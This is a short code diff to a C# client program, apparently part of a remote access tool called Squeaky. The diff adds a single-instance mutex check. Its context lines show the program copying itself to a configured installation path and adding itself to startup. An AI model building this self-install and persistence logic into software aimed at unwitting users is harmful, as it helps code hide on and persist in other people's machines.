@@ -12,6 +12,15 @@ namespace Squeaky.Client
     {
         private static string CurrentLocation = Assembly.GetExecutingAssembly().Location;
 
+        private static void CheckMutex()
+        {
+            bool mutexCheck;
+            var m = new Mutex(true, Settings.MUTEX, out mutexCheck);
+
+            if (!mutexCheck)
+                Environment.Exit(1);
+        }
+
         private static void Install()
         {
             if (!Directory.Exists(Path.GetDirectoryName(Settings.INSTALLATION))) Directory.CreateDirectory(Path.GetDirectoryName(Settings.INSTALLATION));
@@ -89,6 +98,8 @@ namespace Squeaky.Client
 
         public static void Start()
         {
+            CheckMutex();
+
             if (CurrentLocation != Settings.INSTALLATION)
             {
                 if (Settings.STARTUP) AddToStartup();
